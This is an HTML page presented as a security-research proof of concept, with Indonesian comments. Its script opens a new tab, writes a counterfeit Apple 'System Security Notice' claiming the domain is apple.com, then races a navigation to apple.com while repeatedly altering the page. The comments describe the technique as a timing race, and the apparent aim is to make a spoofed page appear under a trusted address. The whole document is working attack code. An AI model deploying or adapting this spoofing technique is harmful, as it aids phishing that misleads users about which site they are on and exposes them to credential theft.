<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
    <title>Advanced Security Research PoC</title>
    <style>
      body, html {
        margin: 0; padding: 0; height: 100%; background: #000;
        display: flex; align-items: center; justify-content: center;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      }
      .card {
        text-align: center; background: #1c1c1e; padding: 40px; border-radius: 20px;
        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
      }
      button {
        padding: 18px 36px; font-size: 20px; font-weight: bold;
        background: #0a84ff; color: #fff; border: none; border-radius: 12px;
        cursor: pointer; transition: transform 0.1s ease;
      }
      button:active { transform: scale(0.95); }
    </style>
  </head>
  <body>
    <div class="card">
      <button id="triggerBtn">INITIATE SECURE HANDSHAKE</button>
    </div>

    <script>
      document.getElementById("triggerBtn").onclick = function () {
        this.style.display = "none";

        // Membuka tab baru / target window secara asinkron
        const targetWindow = window.open("about:blank", "_blank");

        if (targetWindow) {
          // 1. Menyuntikkan tampilan spoofing visual beresolusi tinggi
          targetWindow.document.write(`
            <!DOCTYPE html>
            <html>
            <head><title>Apple - Official Authorization</title></head>
            <body style="margin:0;padding:0;background:#f5f5f7;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:-apple-system,sans-serif;">
              <div style="text-align:center;padding:30px;max-width:500px;">
                <h1 style="font-size:36px;color:#1d1d1f;margin-bottom:15px;font-weight:600;">System Security Notice</h1>
                <p style="font-size:18px;color:#86868b;line-height:1.5;">Your device session is currently being securely validated against trusted regional nodes.</p>
                <div style="margin-top:30px;padding:15px;background:#e5e5ea;border-radius:10px;font-size:14px;color:#3a3a3c;font-weight:500;">
                  Verified Domain: <span style="color:#007aff;">apple.com</span>
                </div>
              </div>
            </body>
            </html>
          `);
          targetWindow.document.close();

          // 2. Memanipulasi race condition navigasi ganda bertingkat (Micro-timing delay)
          setTimeout(() => {
            try {
              // Memicu pergantian lokasi secara instan sebelum tree layout selesai sepenuhnya
              targetWindow.location.replace("https://apple.com");
            } catch (e) {}
          }, 5);

          // 3. Stress-testing delegate callback pipeline tanpa melanggar kebijakan dialog modal
          let stressLoop = 0;
          let interval = setInterval(() => {
            stressLoop++;
            try {
              // Mencoba melakukan manipulasi status DOM ringan untuk menguji konsistensi render thread
              if (targetWindow.document && targetWindow.document.body) {
                targetWindow.document.body.style.zoom = (stressLoop % 2 === 0) ? "1.0" : "1.0001";
              }
              if (stressLoop > 100 || targetWindow.closed) {
                clearInterval(interval);
              }
            } catch (err) {
              clearInterval(interval);
            }
          }, 5);
        }
      };
    </script>
  </body>
</html>
